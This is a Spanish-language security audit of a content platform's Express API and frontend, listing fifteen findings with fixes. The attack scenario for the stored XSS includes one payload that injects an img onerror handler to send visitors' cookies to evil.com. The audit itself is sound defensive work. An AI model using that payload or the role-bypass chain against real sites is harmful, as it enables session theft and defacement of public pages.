# Auditoría integral — CREA Command Center (2026-07-07)

Auditoría de solo lectura sobre `apps/api`, `apps/web`, `apps/admin`, `Dockerfile`, `docker-compose.yml` y `apps/api/scripts`. Cada hallazgo cita archivo y línea reales, verificados leyendo el código — no hay hallazgos especulativos.

## Resumen ejecutivo

La plataforma está construida con buenas prácticas base: casi todas las queries a Postgres son parametrizadas, el frontend escapa el HTML dinámico de forma consistente, y el sistema de roles (director/producción/comercial/colaborador) está bien pensado. Pero se encontraron **2 huecos críticos** que, combinados, permiten que un colaborador de más bajo rango (el rol pensado solo para proponer ideas) publique contenido malicioso directamente en el sitio público sin que nadie lo revise: un endpoint de "redes sociales" no exige el rol correcto, y el HTML que arma para mostrar videos incrustados no escapa bien el título del video, lo que abre la puerta a inyectar código en la página que ven todos los visitantes. Además, la cabecera de seguridad del servidor (Helmet) está montada en el orden equivocado y termina sin aplicarse a ninguna página HTML real, solo a las respuestas JSON de la API — es decir, hoy el sitio y el panel admin no tienen ninguna de esas protecciones activas. También hay una dependencia externa (`node-tar`, usada por `bcrypt`) con vulnerabilidad conocida, y varios puntos de calidad/escalabilidad (cron sin bloqueo de solapamiento, imágenes IA que se acumulan sin límite, cero pruebas automatizadas para el motor de generación de contenido y el newsletter). Nada de esto es difícil de arreglar; se detalla un plan de 3 fases al final.

## Tabla de hallazgos priorizados

| ID | Severidad | Dimensión | Archivo:línea | Descripción | Solución recomendada |
|----|-----------|-----------|----------------|-------------|------------------------|
| H1 | **Crítica** | Seguridad | `apps/api/src/modules/social/index.js:198,215,260` | `GET/POST/PATCH /api/admin/social` solo exigen `requireAuth`, sin `requireRole` — cualquier usuario autenticado (incl. `colaborador`, el rol de menor confianza) puede publicar posts en el feed público sin pasar por el gate editorial. | Agregar `requireRole('director', 'produccion')` a las 3 rutas, igual que ya hace `DELETE` en la línea 297. |
| H2 | **Crítica** | Seguridad | `apps/api/src/modules/social/index.js:74,80` | `buildEmbedHtml()` solo escapa comillas dobles (`.replace(/"/g, '&quot;')`) al insertar el `title` del oEmbed dentro de un atributo `title="..."` de un `<iframe>`. Un título de video con `"><script>...` rompe el atributo e inyecta HTML/JS arbitrario, que luego se inserta sin sanitizar vía `innerHTML` en `apps/web/assets/js/main.js:521` y `apps/web/producciones.html:141`. | Escapar `<`, `>` y `&` además de `"` (usar el mismo `esc()` de `newsletter-template.js:16`) antes de interpolar el título en cualquier atributo HTML. |
| H3 | **Crítica** | Infraestructura/Seguridad | `apps/api/src/server.js:22-30` | `helmet()` se monta **después** de `express.static(...)` (líneas 23-24). Express sirve los archivos estáticos (todo `index.html`, `nota.html`, el panel admin completo) y termina la respuesta antes de que `helmet()` se ejecute — esas páginas nunca reciben CSP, `X-Frame-Options`, `X-Content-Type-Options`, etc. Solo las respuestas JSON de `/api/*` (donde esas cabeceras casi no importan) las reciben. | Mover `app.use(helmet())` y `app.use(cors(...))` **antes** de los `express.static(...)`. |
| H4 | Alta | Seguridad | `apps/api/package.json` (dependencia transitiva) | `npm audit` reporta `tar <=7.5.15` (alta, path traversal/arbitrary write vía `@mapbox/node-pre-gyp` que usa `bcrypt`) y `uuid <11.1.1` (moderada, vía `node-cron`). | Ejecutar `npm audit fix`; para `uuid`/`node-cron` evaluar el upgrade a `node-cron@4` (breaking change, revisar API) o aceptar el riesgo documentándolo (solo se explota en build-time / no en runtime de request). |
| H5 | Alta | Escalabilidad/Calidad | `apps/api/src/lib/newsletter-cron.js:20-43` | El cron corre cada minuto (`* * * * *`). El guard contra duplicados es un `SELECT` seguido de un `INSERT ... ON CONFLICT DO NOTHING`, sin lock. Si `generateContent()` (que llama a Perplexity + Claude, línea 32) tarda más de un minuto, dos ticks pueden pasar el `SELECT` antes de que cualquiera inserte, disparando dos generaciones completas (doble costo de API) — el `ON CONFLICT` solo evita la fila duplicada, no la ejecución duplicada. | Usar un lock a nivel de fila (`SELECT ... FOR UPDATE` sobre una fila de control) o un flag en memoria (`let running = false`) que se libere en el `finally` del `tick()`. |
| H6 | Media | Seguridad | `apps/api/src/modules/content-engine/index.js:52-78` | `POST /api/content/generate-image` y el resto de endpoints de generación IA (`generate-proposal`, `generate-draft`, `qa-check`) no tienen rate limiting propio (a diferencia de `/api/public` y `/api/auth/login`). Una cuenta comprometida o un colaborador con exceso de confianza puede generar llamadas ilimitadas a APIs de pago (OpenRouter/Claude/Perplexity). | Agregar un `rateLimit` moderado (p. ej. 20-30 req/15min por usuario) a las rutas de `content-engine` y `newsletter` que llaman IA. |
| H7 | Media | Escalabilidad | `apps/api/src/modules/content-engine/index.js:52-78` | Cada llamada a `generate-image` inserta una fila nueva en `generated_images` (línea 64-67) y solo actualiza `cover_image_url`; la imagen anterior del mismo `proposal_id` queda huérfana en la tabla (BYTEA, ocupa espacio real) y solo se limpia si la propuesta completa se borra (`DELETE FROM generated_images WHERE proposal_id = $1` en `editorial/index.js:270`). Si un editor regenera la portada varias veces, la DB acumula binarios sin límite. | Antes de insertar la nueva imagen, borrar las filas previas de `generated_images` para ese `proposal_id`, o agregar un job de limpieza periódico. |
| H8 | Media | Seguridad/Config | `apps/api/src/server.js:29`, `docker-compose.yml:55` | `CORS_ORIGIN` no tiene valor por defecto seguro: si queda vacío en producción (como en el `.env` de Dokploy hoy, `CORS_ORIGIN: ${CORS_ORIGIN:-}`), `cors(undefined)` refleja **cualquier origen**. El README documenta la intención correcta pero el código no falla-cerrado si se olvida configurar. | En `config/index.js`, si `nodeEnv === 'production'` y `corsOrigin` está vacío, loguear un warning fuerte al boot (o rechazar arrancar) en vez de caer silenciosamente a "abierto". |
| H9 | Media | Calidad/Tests | `apps/api/scripts/` (ausencia) | No existe ningún check para: `apps/api/src/modules/content-engine/index.js` (generate-proposal/draft/image/qa-check — el corazón del pipeline de IA), `apps/api/src/modules/newsletter/index.js` (`/send` dispara un broadcast real e irreversible a todos los suscriptores sin ninguna prueba), y la lógica de solapamiento de `newsletter-cron.js`. Sí existen checks sólidos para auth/roles, editorial, leads, público y social (`check-admin-api.js`, `check-leads.js`, `check-public-api.js`, `check-social.js`, `verify-e2e.js`). | Priorizar un `check-content-engine.js` (mockeando las respuestas de IA) y un `check-newsletter.js` que cubra generate→preview→send con un proveedor de correo stubbeado. |
| H10 | Baja | Accesibilidad | `apps/web/assets/js/main.js:84` | Comentario propio del código ya documenta el problema: `color:var(--text-mute)` sobre `--bg-2` en `renderEmptyState()` da ~3.9:1 de contraste, por debajo del mínimo AA (4.5:1) para texto normal. Afecta todos los estados vacíos/error del portal (el caso más visible para nuevos visitantes). | Cambiar a `var(--text)` (ya se hace en la línea inmediatamente inferior para el body) o ajustar el token `--text-mute` para cumplir 4.5:1 sobre `--bg-2`. |
| H11 | Baja | SEO | `apps/web/nota.html:16-17`, `apps/web/assets/js/main.js:235-239` | Los meta tags Open Graph (`og:title`, `og:description`, `og:url`, `og:image`) se actualizan vía JavaScript client-side (`setMetaContent`) después de cargar el artículo. Los crawlers de Facebook/WhatsApp (usados activamente por el módulo de `distribution`) no ejecutan JS al generar la vista previa de un link compartido — verán los valores vacíos/genéricos del HTML estático. | Renderizar los meta tags en el servidor (SSR mínimo para `nota.html`) o usar un prerenderer (p. ej. servir HTML pre-hidratado solo a user-agents de bots conocidos). |
| H12 | Baja | Escalabilidad | `apps/api/src/modules/public/index.js:121-135` | `GET /api/public/authors/:name/articles` filtra por `author_name` sin índice dedicado (los índices existentes son `(status, section, published_at)` y `(view_count) WHERE published`). A la escala actual (decenas de artículos) es irrelevante; si el catálogo crece a miles, cada consulta de perfil hace escaneo filtrado. | Agregar `CREATE INDEX ON content_proposals (author_name) WHERE status = 'published'` cuando el volumen lo amerite — no urgente hoy. |
| H13 | Baja | Infraestructura | `Dockerfile:3` | La imagen corre como usuario `root` (no hay instrucción `USER`); `node:22-slim` por defecto no crea ni cambia a un usuario sin privilegios. | Agregar `USER node` (la imagen `node:*-slim` ya trae ese usuario) después de instalar dependencias, ajustando permisos de `/app` si hace falta. |
| H14 | Baja | Infraestructura | `docker-compose.yml:17-61` | El servicio `api` no tiene `healthcheck` (a diferencia de `db`, líneas 11-15), por lo que Docker/Dokploy no puede detectar automáticamente si el proceso Node quedó vivo pero sin responder. | Agregar `healthcheck: test: ["CMD", "node", "-e", "fetch('http://localhost:3000/health').then(r=>process.exit(r.ok?0:1))"]` o equivalente con `curl`. |
| H15 | Baja | Robustez | `apps/api/src/middleware/error-handler.js:1-4` | El handler global responde siempre `err.message` al cliente (`res.status(err.status||500).json({error: err.message ...})`). Para errores no controlados (p. ej. una excepción de `pg` con detalle de la query) esto puede filtrar información interna a un usuario autenticado. Bajo impacto porque casi todos los `catch` locales ya generan mensajes propios antes de llegar aquí. | En producción, para errores sin `err.status` explícito (es decir, no operacionales), devolver un mensaje genérico y loguear el detalle solo en servidor. |

## Detalle de hallazgos críticos y altos

### H1 + H2 combinados: XSS almacenado en el sitio público, sin gate editorial (Crítica)

**Escenario de ataque concreto:**
1. Un usuario con rol `colaborador` (el nivel más bajo, pensado únicamente para proponer ideas de contenido — `ROLE_MODULES.colaborador = ['ideas']` en `apps/api/src/modules/auth/role-modules.js:8`) obtiene un JWT válido vía `/api/auth/login` con sus propias credenciales legítimas.
2. Sube un video a TikTok o YouTube con el título `Video normal"><img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>`.
3. Llama directamente `POST /api/admin/social` con `{ "external_url": "https://www.tiktok.com/@x/video/123..." }` y su token. La ruta solo verifica `requireAuth` (línea 215), **no** `requireRole('director','produccion')` — el colaborador no debería poder tocar este módulo según el mapa de roles, pero el backend no lo aplica.
4. `is_published` es `true` por defecto (`const published = is_published !== false;`, línea 239) — el post queda **publicado de inmediato**, sin revisión humana, a diferencia de todo el resto del pipeline editorial.
5. Cuando cualquier visitante abre `producciones.html` o `tercer-tiempo.html`, el frontend pide `GET /api/public/social/:id/embed`, que llama `buildEmbedHtml('tiktok', url, title)` (`social/index.js:70-76`). Esa función solo reemplaza comillas dobles en el título antes de meterlo en `title="..."` dentro del string del `<iframe>`. El título malicioso rompe el atributo e inyecta el `<img onerror=...>`.
6. `apps/web/assets/js/main.js:521` hace `el.innerHTML = data.embed_html` — el HTML inyectado se ejecuta en el navegador de **todos los visitantes del sitio público**, sin necesidad de que ningún director apruebe nada.

**Impacto:** robo de sesión (si hubiera cookies), phishing in-page, defacement, o pivoteo a robar el JWT del `localStorage` de cualquier miembro del staff que también visite el sitio público logueado en otra pestaña.

**Solución:**
```js
// social/index.js — agregar el rol correcto (igual que ya hace DELETE, línea 297)
router.get('/admin/social', requireAuth, requireRole('director', 'produccion'), async (req, res, next) => { ... });
router.post('/admin/social', requireAuth, requireRole('director', 'produccion'), async (req, res, next) => { ... });
router.patch('/admin/social/:id', requireAuth, requireRole('director', 'produccion'), async (req, res, next) => { ... });

// buildEmbedHtml — escapar de verdad, no solo comillas dobles
function escAttr(str) {
  return String(str || '').replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));
}
// usar escAttr(title) en vez de (title || '').replace(/"/g, '&quot;')
```

### H3: Helmet no protege ninguna página HTML real (Crítica)

**Escenario concreto:** `apps/api/src/server.js` monta los middlewares en este orden:
```js
app.use(express.static(path.join(__dirname, '../../web')));   // línea 23
app.use('/admin', express.static(path.join(__dirname, '../../admin')));  // línea 24
app.use(helmet());                                              // línea 26 ← tarde
app.use(cors(...));                                              // línea 29
```
Express ejecuta los middlewares en orden y, si `express.static` encuentra el archivo pedido, **responde ahí mismo y nunca llama a `next()`**. Por lo tanto, cualquier petición a `/`, `/index.html`, `/nota.html`, `/admin/`, `/admin/assets/js/panel.js`, etc. — es decir, el 100% de las páginas HTML del sitio y del panel admin — se sirve sin CSP, sin `X-Frame-Options`, sin `X-Content-Type-Options: nosniff`, sin ninguna de las protecciones de Helmet. Solo las rutas que **no** coinciden con un archivo estático (las de `/api/*`) llegan a `helmet()`, y ahí las cabeceras se aplican a respuestas JSON donde aportan poco.

**Impacto real:** el panel admin (que maneja el JWT del director en `localStorage`) puede ser embebido en un `<iframe>` desde cualquier sitio externo (sin `X-Frame-Options`/`frame-ancestors`) — vector clásico de clickjacking para engañar a un director y hacerle aprobar/publicar contenido con clics disfrazados. Sin CSP tampoco hay segunda barrera si en el futuro se cuela una inyección como la de H2.

**Solución:**
```js
// server.js — helmet y cors ANTES de servir estáticos
const app = express();

app.use(helmet());
app.use(cors(config.corsOrigin ? { origin: config.corsOrigin.split(',') } : undefined));
app.use(express.json());

app.use(express.static(path.join(__dirname, '../../web')));
app.use('/admin', express.static(path.join(__dirname, '../../admin')));
```

### H4: Dependencia vulnerable (`tar` vía `bcrypt`/`node-pre-gyp`) (Alta)

`npm audit --production` en `apps/api` reporta 4 vulnerabilidades (2 altas, 2 moderadas): `tar <=7.5.15` (path traversal/overwrite arbitrario en extracción, usado por `@mapbox/node-pre-gyp`, dependencia de `bcrypt` para bajar el binario precompilado) y `uuid <11.1.1` (falta de validación de límites de buffer, vía `node-cron`). El vector de `tar` es de build-time (`npm install`), no de request-time, por lo que el riesgo real en producción es bajo, pero conviene resolverlo porque `npm audit fix` lo arregla sin cambios de breaking.

**Solución:** `npm audit fix` (resuelve `tar`); para `uuid`/`node-cron` evaluar `npm audit fix --force` (sube `node-cron` a v4, revisar cambios de API antes) o aceptar el riesgo documentándolo explícitamente.

### H5: Cron del newsletter sin lock contra solapamiento (Alta)

`apps/api/src/lib/newsletter-cron.js` programa `tick()` cada minuto exacto (`* * * * *`). La única protección contra generar el newsletter dos veces es leer si ya existe una fila para `CURRENT_DATE` (línea 28) antes de generar. Si `generateContent()` — que llama a Perplexity y Claude en cascada (`newsletter-content.js:50-55`) — tarda más de 60 segundos (razonable si algún proveedor está lento), el siguiente tick arranca antes de que el primero haya insertado su fila, así que ambos pasan el chequeo y ambos disparan generación completa (dos cargos de API, posible condición de carrera en `pickNextSponsor()` que hace `UPDATE ... last_sponsored_at = now()`, línea 32 de `newsletter-content.js`, sobre el mismo cliente dos veces).

**Solución:** flag en memoria simple (suficiente para una sola instancia, que es el diseño actual):
```js
let running = false;
async function tick() {
  if (running) return;
  running = true;
  try { /* lógica actual */ } finally { running = false; }
}
```

## Plan de implementación recomendado

**Fase 1 — Esta semana (bloqueante, expone el sitio público hoy mismo):**
1. H1 + H2 juntos: agregar `requireRole` a `/api/admin/social` y arreglar el escape de `title` en `buildEmbedHtml`. Es la misma sesión de trabajo — cortan la misma cadena de ataque.
2. H3: reordenar `helmet()`/`cors()` antes de `express.static` en `server.js`. Cambio de una línea, sin riesgo de regresión funcional (verificar visualmente que el sitio y el panel sigan cargando tras el cambio).
3. H4: `npm audit fix` en `apps/api`.

**Fase 2 — Próximas 2 semanas (reduce riesgo de costo/abuso y datos huérfanos):**
4. H6: rate limit en endpoints de generación IA (`content-engine`, `newsletter`).
5. H5: lock contra solapamiento en `newsletter-cron.js`.
6. H7: limpieza de `generated_images` huérfanas al regenerar portada.
7. H8: fail-loud si `CORS_ORIGIN` queda vacío en `NODE_ENV=production`.

**Fase 3 — Cuando haya ancho de banda (calidad de vida, no urgente):**
8. H9: tests para `content-engine` y `newsletter` (los dos módulos con llamadas irreversibles/costosas sin cobertura).
9. H10: contraste de `renderEmptyState`.
10. H11: SEO/OG server-rendered para que compartir en Facebook/WhatsApp muestre preview correcta (relevante porque `distribution` empuja activamente a esos canales).
11. H12, H13, H14, H15: mejoras menores de infraestructura e índices, sin apuro a la escala actual.
